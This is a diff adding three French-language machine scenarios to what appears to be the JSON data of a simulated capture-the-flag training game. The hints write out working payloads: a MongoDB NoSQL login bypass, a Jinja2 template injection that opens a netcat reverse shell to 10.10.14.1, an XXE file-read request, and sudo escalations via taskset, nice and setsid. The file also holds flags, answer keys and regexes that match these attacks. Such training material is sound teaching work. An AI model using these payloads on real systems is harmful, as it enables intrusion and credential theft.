@@ -782,6 +782,224 @@
     }
   },
   {
+    "id": "aether",
+    "name": "AETHER",
+    "ip": "10.10.11.90",
+    "difficulty": "Moyen",
+    "os": "Linux (Debian 12)",
+    "briefing": "Une API interne de ticketing, dopée à MongoDB. Le formulaire de connexion accepte des objets JSON un peu trop confiants dans les entrées utilisateur.",
+    "ports": [
+      {
+        "port": 22,
+        "proto": "tcp",
+        "state": "open",
+        "service": "ssh",
+        "version": "OpenSSH 9.2p1 Debian"
+      },
+      {
+        "port": 3000,
+        "proto": "tcp",
+        "state": "open",
+        "service": "http",
+        "version": "Aether Ticketing API (Node.js / Express + MongoDB)"
+      }
+    ],
+    "web": {
+      "/": "<html>\n<head><title>Aether Ticketing</title></head>\n<body>\n<h1>Aether Ticketing API</h1>\n<p>Authentification : POST /api/login (JSON)</p>\n<!-- doc rapide : /api/docs -->\n</body>\n</html>",
+      "/api/docs": "Aether Ticketing API v1\n\nPOST /api/login\nBody JSON attendu : { \"user\": \"<login>\", \"pass\": \"<mot de passe>\" }\n\n(note interne : le pilote MongoDB n'échappe pas les opérateurs de requête envoyés depuis le body -- a corriger)"
+    },
+    "ftp": {
+      "enabled": false
+    },
+    "nosqli": {
+      "path": "/api/login",
+      "injectionRegex": {
+        "__regex__": "\\$ne|\\$gt|\\$exists|\\$regex|\\$in\\b",
+        "__flags__": "i"
+      },
+      "successBody": "{\"status\":\"ok\",\"message\":\"Connexion admin reussie (bypass NoSQL sur le champ pass).\",\"note\":\"Identifiants SSH de secours (rotation en attente) : tbernard / Aeth3r_N0sql_Byp4ss!\"}",
+      "failBody": "{\"status\":\"error\",\"message\":\"Identifiants invalides.\"}"
+    },
+    "sshUsers": {
+      "tbernard": {
+        "password": "Aeth3r_N0sql_Byp4ss!"
+      }
+    },
+    "targetFS": {
+      "hostname": "aether",
+      "homeDir": "/home/tbernard",
+      "users": {
+        "tbernard": {
+          "home": "/home/tbernard",
+          "fs": {
+            "user.txt": {
+              "type": "file",
+              "content": "FLAG{aether_acces_initial_nosqli_bypass}",
+              "perms": "-rw-r-----",
+              "owner": "tbernard"
+            },
+            ".bash_history": {
+              "type": "file",
+              "content": "id\nsudo -l\nexit",
+              "perms": "-rw-------",
+              "owner": "tbernard"
+            },
+            "notes.txt": {
+              "type": "file",
+              "content": "Pense-bête : sudo -l m'autorise taskset en NOPASSWD. Ça sert à épingler un process sur un cœur CPU... et accessoirement, GTFOBins en fait tout autre chose.",
+              "perms": "-rw-r--r--",
+              "owner": "tbernard"
+            },
+            "note_interne.txt": {
+              "type": "file",
+              "content": "Note interne — Solenne Holdings\nUn admin s'étonne que la base MongoDB de l'API ait été migrée en urgence juste après le dernier rapport de R. Kade. Personne ne veut dire pourquoi le contrôle des mots de passe a été laissé \"temporairement\" permissif.",
+              "perms": "-rw-r--r--",
+              "owner": "tbernard"
+            }
+          }
+        }
+      },
+      "extraFS": {},
+      "sudoL": "L'utilisateur tbernard peut lancer les commandes suivantes sur aether :\n    (root) NOPASSWD: /usr/bin/taskset"
+    },
+    "privesc": {
+      "type": "sudo-direct",
+      "exploit": {
+        "tool": "sudo",
+        "bin": "taskset 1",
+        "spawn": "/bin/sh"
+      },
+      "enterMsg": "# (shell root obtenu via taskset -- technique GTFOBins)"
+    },
+    "rootFile": {
+      "path": "/root/root.txt",
+      "content": "FLAG{aether_root_taskset_gtfobins}"
+    },
+    "hints": {
+      "recon": [
+        "Cette API accepte des identifiants au format JSON -- regarde bien comment le body est construit.",
+        "Après `nmap 10.10.11.90`, lis `curl http://10.10.11.90/` puis `curl http://10.10.11.90/api/docs` : le format attendu par /api/login est précisé, ainsi qu'un indice sur le pilote MongoDB.",
+        "Le commentaire de la doc dit que les opérateurs de requête MongoDB envoyés dans le body ne sont pas filtrés."
+      ],
+      "access": [
+        "Une injection NoSQL classique remplace un champ texte par un objet contenant un opérateur MongoDB, par exemple `{\"$ne\": null}` -- \"différent de null\" est presque toujours vrai.",
+        "Envoie ça en POST avec curl : `curl -d '{\"user\":\"admin\",\"pass\":{\"$ne\":null}}' http://10.10.11.90/api/login`.",
+        "La réponse fuite des identifiants SSH de secours. Connecte-toi avec `ssh tbernard@10.10.11.90`."
+      ],
+      "privesc": [
+        "`sudo -l` une fois connecté : une seule commande NOPASSWD, pas évidente au premier abord.",
+        "`taskset` sert normalement à épingler un processus sur un CPU précis -- mais GTFOBins référence une façon de l'utiliser pour lancer un shell.",
+        "Lance `sudo taskset 1 /bin/sh` pour obtenir un shell root."
+      ]
+    }
+  },
+  {
+    "id": "eclipse",
+    "name": "ECLIPSE",
+    "ip": "10.10.11.195",
+    "difficulty": "Difficile",
+    "os": "Linux (Debian 12)",
+    "briefing": "Un générateur de rapports internes. Le nom personnalisé passé en paramètre est injecté tel quel dans un moteur de templates côté serveur.",
+    "ports": [
+      {
+        "port": 22,
+        "proto": "tcp",
+        "state": "open",
+        "service": "ssh",
+        "version": "OpenSSH 9.2p1 Debian"
+      },
+      {
+        "port": 8081,
+        "proto": "tcp",
+        "state": "open",
+        "service": "http",
+        "version": "Eclipse ReportGen (Python / Jinja2)"
+      }
+    ],
+    "web": {
+      "/": "<html>\n<head><title>Eclipse ReportGen</title></head>\n<body>\n<h1>Eclipse ReportGen</h1>\n<p>Génération de rapport personnalisé.</p>\n<!-- essai : /report?name=... -->\n<!-- TODO: échapper le paramètre avant de le passer au moteur de rendu -->\n</body>\n</html>"
+    },
+    "ftp": {
+      "enabled": false
+    },
+    "ssti": {
+      "path": "/report",
+      "param": "name",
+      "pocRegex": {
+        "__regex__": "^\\{\\{\\s*7\\s*\\*\\s*7\\s*\\}\\}$",
+        "__flags__": ""
+      },
+      "pocResponse": "Aperçu du rapport pour : 49\n(le moteur de templates a évalué l'expression -- confirmation d'une SSTI)",
+      "injectRegex": {
+        "__regex__": "\\{\\{.*nc\\s+\\d+\\.\\d+\\.\\d+\\.\\d+\\s+\\d+.*\\}\\}",
+        "__flags__": "i"
+      },
+      "user": "rpasquier"
+    },
+    "sshUsers": {},
+    "targetFS": {
+      "hostname": "eclipse",
+      "homeDir": "/home/rpasquier",
+      "users": {
+        "rpasquier": {
+          "home": "/home/rpasquier",
+          "fs": {
+            "user.txt": {
+              "type": "file",
+              "content": "FLAG{eclipse_acces_initial_ssti_rce}",
+              "perms": "-rw-r--r--",
+              "owner": "rpasquier"
+            },
+            ".bash_history": {
+              "type": "file",
+              "content": "id\nsudo -l\nexit",
+              "perms": "-rw-------",
+              "owner": "rpasquier"
+            },
+            "note_interne.txt": {
+              "type": "file",
+              "content": "Note interne — Solenne Holdings\nLe moteur de templates du générateur de rapports a été ajouté juste avant le départ forcé de R. Kade. Elle avait déjà flaggé le rendu \"trop permissif\" dans un brouillon jamais envoyé.",
+              "perms": "-rw-r--r--",
+              "owner": "rpasquier"
+            }
+          }
+        }
+      },
+      "extraFS": {},
+      "sudoL": "L'utilisateur rpasquier peut lancer les commandes suivantes sur eclipse :\n    (root) NOPASSWD: /usr/bin/nice"
+    },
+    "privesc": {
+      "type": "sudo-direct",
+      "exploit": {
+        "tool": "sudo",
+        "bin": "nice",
+        "spawn": "/bin/sh"
+      },
+      "enterMsg": "# (shell root obtenu via nice -- technique GTFOBins)"
+    },
+    "rootFile": {
+      "path": "/root/root.txt",
+      "content": "FLAG{eclipse_root_nice_gtfobins}"
+    },
+    "hints": {
+      "recon": [
+        "Le générateur de rapports accepte un nom personnalisé en paramètre -- regarde bien ce que le commentaire du code source en dit.",
+        "Après `nmap 10.10.11.195`, lis `curl http://10.10.11.195:8081/` : un commentaire pointe vers `/report?name=...` et prévient que le paramètre n'est pas échappé avant le rendu.",
+        "Teste une expression de calcul entre doubles accolades pour voir si elle est évaluée côté serveur : `curl \"http://10.10.11.195:8081/report?name={{7*7}}\"`."
+      ],
+      "access": [
+        "Si le rapport affiche 49 au lieu de `{{7*7}}` littéral, le moteur de templates évalue bien ton expression -- c'est une SSTI (Server-Side Template Injection).",
+        "Une SSTI permet souvent d'aller jusqu'à l'exécution de commandes via les objets internes exposés par le framework. Mets-toi d'abord en écoute : `nc -lvnp 4444`.",
+        "Déclenche le rappel : `curl \"http://10.10.11.195:8081/report?name={{ os.popen('nc 10.10.14.1 4444 -e /bin/sh').read() }}\"` (même port des deux côtés). Tu obtiens un shell rpasquier."
+      ],
+      "privesc": [
+        "`sudo -l` une fois connecté : une seule commande NOPASSWD.",
+        "`nice` relance simplement le programme donné en argument, avec les droits sudo hérités -- GTFOBins l'utilise pour lancer un shell root direct.",
+        "Lance `sudo nice /bin/sh` pour obtenir un shell root."
+      ]
+    }
+  },
+  {
     "id": "stratus",
     "name": "STRATUS",
     "ip": "10.10.11.120",
@@ -1102,6 +1320,119 @@
         "Toujours `sudo -l` en arrivant.",
         "`perl` est autorisé en NOPASSWD — GTFOBins propose un one-liner pour sortir un shell.",
         "Exécute `sudo perl -e 'exec \"/bin/sh\";'` pour obtenir un shell root."
+      ]
+    }
+  },
+  {
+    "id": "vesper",
+    "name": "VESPER",
+    "ip": "10.10.11.162",
+    "difficulty": "Difficile",
+    "os": "Linux (Debian 12)",
+    "briefing": "Un service interne d'import de documents. Il accepte du XML brut... et le parseur est resté sur sa configuration par défaut, entités externes comprises.",
+    "ports": [
+      {
+        "port": 22,
+        "proto": "tcp",
+        "state": "open",
+        "service": "ssh",
+        "version": "OpenSSH 9.2p1 Debian"
+      },
+      {
+        "port": 8090,
+        "proto": "tcp",
+        "state": "open",
+        "service": "http",
+        "version": "Vesper DocImport (Java / SAX parser)"
+      }
+    ],
+    "web": {
+      "/": "<html>\n<head><title>Vesper DocImport</title></head>\n<body>\n<h1>Vesper DocImport</h1>\n<p>Import de documents XML pour le service compta.</p>\n<!-- POST /api/import — XML brut uniquement, pas de multipart -->\n<!-- TODO: désactiver la résolution des entités externes (DTD) avant la prod -->\n</body>\n</html>"
+    },
+    "ftp": {
+      "enabled": false
+    },
+    "xxe": {
+      "path": "/api/import",
+      "secretPath": "/etc/vesper/service.conf",
+      "entityRegex": {
+        "__regex__": "<!ENTITY\\s+\\w+\\s+SYSTEM\\s+[\"']file:\\/\\/([^\"']+)[\"']\\s*>",
+        "__flags__": "i"
+      },
+      "successBody": "<result>\n  <status>ok</status>\n  <content># /etc/vesper/service.conf\nSSH_USER=kbrennan\nSSH_PASS=V3sper_XXE_L34k!63\n(fichier injecte via l'entite externe resolue par le parseur XML)</content>\n</result>",
+      "notFoundBody": "<result>\n  <status>error</status>\n  <message>Entite externe resolue, mais fichier introuvable a ce chemin.</message>\n</result>",
+      "failBody": "<result>\n  <status>error</status>\n  <message>Document XML invalide ou aucune entite externe detectee.</message>\n</result>"
+    },
+    "sshUsers": {
+      "kbrennan": {
+        "password": "V3sper_XXE_L34k!63"
+      }
+    },
+    "targetFS": {
+      "hostname": "vesper",
+      "homeDir": "/home/kbrennan",
+      "users": {
+        "kbrennan": {
+          "home": "/home/kbrennan",
+          "fs": {
+            "user.txt": {
+              "type": "file",
+              "content": "FLAG{vesper_acces_initial_xxe_file_disclosure}",
+              "perms": "-rw-r-----",
+              "owner": "kbrennan"
+            },
+            ".bash_history": {
+              "type": "file",
+              "content": "id\nsudo -l\nexit",
+              "perms": "-rw-------",
+              "owner": "kbrennan"
+            },
+            "notes.txt": {
+              "type": "file",
+              "content": "Pense-bête : sudo -l m'autorise setsid en NOPASSWD. Je m'en sers pour détacher des jobs de leur terminal... en théorie.",
+              "perms": "-rw-r--r--",
+              "owner": "kbrennan"
+            },
+            "note_interne.txt": {
+              "type": "file",
+              "content": "Note interne — Solenne Holdings\nLe service d'import compta tourne encore avec la configuration XML par défaut du framework. R. Kade l'avait comparé à \"laisser la porte de derrière grande ouverte\" dans un rapport que personne n'a lu jusqu'au bout.",
+              "perms": "-rw-r--r--",
+              "owner": "kbrennan"
+            }
+          }
+        }
+      },
+      "extraFS": {},
+      "sudoL": "L'utilisateur kbrennan peut lancer les commandes suivantes sur vesper :\n    (root) NOPASSWD: /usr/bin/setsid"
+    },
+    "privesc": {
+      "type": "sudo-direct",
+      "exploit": {
+        "tool": "sudo",
+        "bin": "setsid",
+        "spawn": "/bin/sh"
+      },
+      "enterMsg": "# (shell root obtenu via setsid -- technique GTFOBins)"
+    },
+    "rootFile": {
+      "path": "/root/root.txt",
+      "content": "FLAG{vesper_root_setsid_gtfobins}"
+    },
+    "hints": {
+      "recon": [
+        "Ce service accepte des documents XML en entrée -- pense à ce qu'un parseur XML mal configuré peut faire avec des entités externes.",
+        "Après `nmap 10.10.11.162`, lis `curl http://10.10.11.162:8090/` : un commentaire précise l'endpoint d'import et prévient que la résolution DTD n'a pas été désactivée.",
+        "Une XXE (XML External Entity) permet de déclarer une entité `SYSTEM \"file://<chemin>\"` dans la DTD d'un document XML : le parseur va lire ce fichier et l'injecter dans le document traité."
+      ],
+      "access": [
+        "Construis un document XML avec une DTD interne déclarant une entité externe, puis référence-la dans le corps du document.",
+        "Le fichier de configuration du service est un bon candidat pour une XXE de divulgation de fichier -- essaie `/etc/vesper/service.conf`.",
+        "Envoie-le en POST : `curl -d '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/vesper/service.conf\">]><r>&x;</r>' http://10.10.11.162:8090/api/import`. La réponse fuite des identifiants SSH."
+      ],
+      "privesc": [
+        "`sudo -l` une fois connecté : une seule commande NOPASSWD, pas la plus évidente.",
+        "`setsid` lance un programme dans une nouvelle session -- GTFOBins l'utilise pour obtenir un shell root direct puisqu'il hérite des droits sudo.",
+        "Lance `sudo setsid /bin/sh` pour obtenir un shell root."
       ]
     }
   },
